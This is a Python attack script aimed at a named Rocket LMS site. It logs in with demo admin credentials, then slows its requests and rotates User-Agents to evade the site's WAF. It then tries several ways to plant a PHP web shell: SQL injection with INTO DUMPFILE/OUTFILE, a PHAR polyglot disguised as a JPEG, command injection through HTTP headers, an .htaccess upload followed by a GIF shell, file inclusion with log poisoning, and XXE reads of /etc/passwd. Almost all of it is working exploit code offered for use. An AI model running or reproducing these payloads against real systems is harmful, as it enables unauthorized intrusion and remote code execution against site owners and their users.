"""
ROCKET LMS - STEALTH WAF BYPASS
===============================
More patient, stealthier approach to defeat the WAF

Strategy:
1. Use delays between requests
2. Rotate User-Agents
3. Focus on exploitation via SQLi -> file write via DUMPFILE
4. Try PHAR deserialization via image upload
"""

import requests
import re
import time
import random
import io
import zipfile

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

session = requests.Session()
session.timeout = 30

def stealth_delay():
    """Random delay between requests"""
    time.sleep(random.uniform(2, 4))

def get_headers():
    """Get random headers"""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
    }

def login():
    print("[*] Logging in stealthily...")
    stealth_delay()
    session.headers.update(get_headers())
    r = session.get(f"{BASE_URL}/admin/login")
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
    stealth_delay()
    session.post(f"{BASE_URL}/admin/login", data={"_token": csrf, "email": ADMIN_EMAIL, "password": ADMIN_PASS})
    print("[+] Logged in")

def get_csrf():
    stealth_delay()
    r = session.get(f"{BASE_URL}/admin/settings")
    match = re.search(r'name="_token" value="([^"]+)"', r.text)
    return match.group(1) if match else None

# ============================================
# TECHNIQUE 1: SQLi DUMPFILE
# ============================================

def sqli_dumpfile():
    """
    Use SQLi to write file via DUMPFILE
    Different from INTO OUTFILE - might bypass restrictions
    """
    print("\n" + "="*60)
    print("    STEALTH SQLi DUMPFILE")
    print("="*60)
    
    shell = "<?php system($_GET['c']); ?>"
    shell_hex = shell.encode().hex()
    
    # DUMPFILE writes binary, no escaping
    payloads = [
        # DUMPFILE variant
        f"1 UNION SELECT 0x{shell_hex} INTO DUMPFILE '/var/www/html/public/d.php'",
        f"1 UNION SELECT 0x{shell_hex} INTO DUMPFILE '/tmp/d.php'",
        
        # OUTFILE with different paths
        f"1 UNION SELECT 0x{shell_hex} INTO OUTFILE '/home/www-data/public/d.php'",
        
        # Using LOAD_FILE to read then write
        f"1 AND (SELECT 0x{shell_hex} INTO OUTFILE '/var/www/public/d.php')",
    ]
    
    for payload in payloads:
        print(f"\n[*] Trying: {payload[:50]}...")
        stealth_delay()
        
        try:
            session.headers.update(get_headers())
            r = session.get(f"{BASE_URL}/instructor-finder", 
                          params={"min_age": payload})
            print(f"    Status: {r.status_code}")
            
            # Check shell
            stealth_delay()
            check = session.get(f"{BASE_URL}/d.php?c=id")
            if "uid=" in check.text:
                print(f"\n[!!!] DUMPFILE RCE SUCCESS!")
                return True
                
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

# ============================================
# TECHNIQUE 2: PHAR DESERIALIZATION
# ============================================

def phar_deserialization():
    """
    Create PHAR archive disguised as image
    If any file operation uses phar:// wrapper, we get RCE
    """
    print("\n" + "="*60)
    print("    PHAR DESERIALIZATION ATTEMPT")
    print("="*60)
    
    csrf = get_csrf()
    
    # Create PHAR with PHP prefix (disguised as JPEG)
    # PHAR polyglot: Valid JPEG + Valid PHAR
    
    # JPEG header
    jpeg_header = bytes([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46])
    
    # Create minimal PHAR stub
    phar_content = jpeg_header + b"""<?php __HALT_COMPILER(); ?>
<?php
system($_GET['c']);
?>"""

    # Upload as different extensions
    extensions = [
        ("avatar.jpg", "image/jpeg"),
        ("avatar.png", "image/png"),
        ("avatar.gif", "image/gif"),
    ]
    
    for filename, mime in extensions:
        print(f"\n[*] Uploading PHAR as: {filename}")
        stealth_delay()
        
        try:
            files = {'avatar': (filename, phar_content, mime)}
            data = {'_token': csrf}
            
            session.headers.update(get_headers())
            r = session.post(f"{BASE_URL}/panel/setting", files=files, data=data)
            print(f"    Status: {r.status_code}")
            
            if r.status_code in [200, 302]:
                # Try to trigger PHAR via any file operation
                # Look for the uploaded file path
                phar_paths = [
                    f"phar:///var/www/storage/{filename}/shell.php",
                    f"phar://./storage/avatars/{filename}",
                ]
                
                for phar_path in phar_paths:
                    check = session.get(f"{BASE_URL}/instructor-finder", 
                                       params={"min_age": f"1 AND LOAD_FILE('{phar_path}')"})
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

# ============================================
# TECHNIQUE 3: BLIND COMMAND INJECTION VIA HEADERS
# ============================================

def header_command_injection():
    """
    Try command injection via various headers
    Some PHP apps use headers in system commands
    """
    print("\n" + "="*60)
    print("    HEADER COMMAND INJECTION")
    print("="*60)
    
    # Headers that might be used in system commands
    injection_headers = [
        ("User-Agent", "$(id)", "Command substitution"),
        ("User-Agent", "`id`", "Backticks"),
        ("User-Agent", "| id", "Pipe"),
        ("X-Forwarded-For", "127.0.0.1; id", "Semicolon"),
        ("X-Real-IP", "127.0.0.1 && id", "AND"),
        ("Accept-Language", "en; id #", "Comment"),
        ("Referer", "http://test.com/$(id)", "Referer inject"),
    ]
    
    for header, value, desc in injection_headers:
        print(f"\n[*] Testing: {desc}")
        stealth_delay()
        
        try:
            headers = {header: value}
            headers.update(get_headers())
            
            r = session.get(f"{BASE_URL}/", headers=headers)
            
            # Check response for command output
            if "uid=" in r.text:
                print(f"    [!!!] Command Injection via {header}!")
                return True
                
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

# ============================================
# TECHNIQUE 4: EXTENSION BYPASS VIA .HTACCESS
# ============================================

def htaccess_bypass():
    """
    Try uploading .htaccess to enable PHP execution
    """
    print("\n" + "="*60)
    print("    .HTACCESS UPLOAD BYPASS")
    print("="*60)
    
    csrf = get_csrf()
    
    # .htaccess payloads
    htaccess_payloads = [
        # Enable PHP in .gif files
        "AddType application/x-httpd-php .gif",
        # Enable PHP in .png files  
        "AddType application/x-httpd-php .png .jpg",
        # PHP handler for all files
        "SetHandler application/x-httpd-php",
        # Enable CGI
        "Options +ExecCGI\nAddHandler cgi-script .gif",
    ]
    
    for htaccess in htaccess_payloads:
        print(f"\n[*] Trying: {htaccess[:40]}...")
        stealth_delay()
        
        try:
            files = {'file': ('.htaccess', htaccess.encode(), 'text/plain')}
            data = {'_token': csrf}
            
            session.headers.update(get_headers())
            r = session.post(f"{BASE_URL}/panel/files/store", files=files, data=data)
            print(f"    Status: {r.status_code}")
            
            if r.status_code != 403:
                # Now try uploading a GIF with PHP code
                shell_gif = b"GIF89a<?php system($_GET['c']); ?>"
                files = {'file': ('shell.gif', shell_gif, 'image/gif')}
                
                stealth_delay()
                r2 = session.post(f"{BASE_URL}/panel/files/store", files=files, data=data)
                
                if r2.status_code not in [403, 419]:
                    # Check if we can execute
                    check = session.get(f"{BASE_URL}/storage/shell.gif?c=id")
                    if "uid=" in check.text:
                        print(f"    [!!!] .htaccess + GIF RCE SUCCESS!")
                        return True
                        
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

# ============================================
# TECHNIQUE 5: PHP SELF INCLUSION
# ============================================

def php_self_inclusion():
    """
    Try to include the current PHP file with payload in parameters
    Some apps do: include($_GET['lang'] . '.php')
    """
    print("\n" + "="*60)
    print("    PHP SELF INCLUSION")
    print("="*60)
    
    # Different inclusion patterns
    patterns = [
        # Using php://input
        ("lang", "php://input", "<?php system('id'); ?>", "POST"),
        
        # Using data:// wrapper
        ("lang", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", None, "GET"),
        
        # LFI with session
        ("page", "/tmp/sess_" + session.cookies.get('laravel_session', 'test'), None, "GET"),
        
        # Access log inclusion (with User-Agent poison)
        ("file", "/var/log/apache2/access.log", None, "GET"),
    ]
    
    # First, poison the User-Agent in logs
    poison_headers = {"User-Agent": "<?php system($_GET['c']); ?>"}
    session.get(f"{BASE_URL}/poison_trigger", headers=poison_headers)
    
    for param, value, body, method in patterns:
        print(f"\n[*] Testing: {param}={value[:30]}...")
        stealth_delay()
        
        try:
            endpoints = [
                f"/panel/setting?{param}={value}&c=id",
                f"/admin?{param}={value}&c=id",
                f"/?{param}={value}&c=id",
            ]
            
            for endpoint in endpoints:
                if method == "POST" and body:
                    r = session.post(f"{BASE_URL}{endpoint}", data=body)
                else:
                    r = session.get(f"{BASE_URL}{endpoint}")
                
                if "uid=" in r.text:
                    print(f"    [!!!] PHP Inclusion RCE: {endpoint}")
                    return True
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

# ============================================
# TECHNIQUE 6: XXE INJECTION
# ============================================

def xxe_injection():
    """
    Try XXE if any endpoint accepts XML
    """
    print("\n" + "="*60)
    print("    XXE INJECTION")
    print("="*60)
    
    csrf = get_csrf()
    
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>"""

    xxe_rce = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "expect://id" >
]>
<foo>&xxe;</foo>"""

    endpoints = [
        "/api/import",
        "/admin/import",
        "/webhook",
        "/api/webhook",
    ]
    
    for endpoint in endpoints:
        print(f"\n[*] Testing XXE at: {endpoint}")
        stealth_delay()
        
        try:
            headers = {"Content-Type": "application/xml"}
            
            r = session.post(f"{BASE_URL}{endpoint}", data=xxe_payload, headers=headers)
            
            if "root:" in r.text:
                print(f"    [!!!] XXE Found at {endpoint}!")
                return True
                
            # Try RCE variant
            stealth_delay()
            r2 = session.post(f"{BASE_URL}{endpoint}", data=xxe_rce, headers=headers)
            
            if "uid=" in r2.text:
                print(f"    [!!!] XXE RCE at {endpoint}!")
                return True
                
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

def check_shells():
    """Check for any uploaded shells"""
    print("\n[*] Final shell check...")
    
    paths = [
        "/d.php?c=id",
        "/shell.php?c=id",
        "/s.php?c=id",
        "/public/d.php?c=id",
        "/storage/shell.gif?c=id",
    ]
    
    for path in paths:
        try:
            r = session.get(f"{BASE_URL}{path}", timeout=5)
            if "uid=" in r.text or "www-data" in r.text:
                print(f"\n[!!!] SHELL FOUND: {BASE_URL}{path}")
                return True
        except:
            pass
    
    return False

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       STEALTH WAF BYPASS - PATIENT AND PERSISTENT            ║
║       Target: lms.rocket-soft.org                            ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    login()
    
    # Execute stealthy techniques
    if sqli_dumpfile():
        return
        
    if phar_deserialization():
        return
        
    if header_command_injection():
        return
        
    if htaccess_bypass():
        return
        
    if php_self_inclusion():
        return
        
    if xxe_injection():
        return
    
    # Final check
    if check_shells():
        print("\n[+] WE FOUND A WAY IN!")
    else:
        print("\n[*] Stealth attack complete. WAF is very strong.")
    
    print("\n" + "="*60)
    print("    ATTACK COMPLETE")
    print("="*60)

if __name__ == "__main__":
    main()
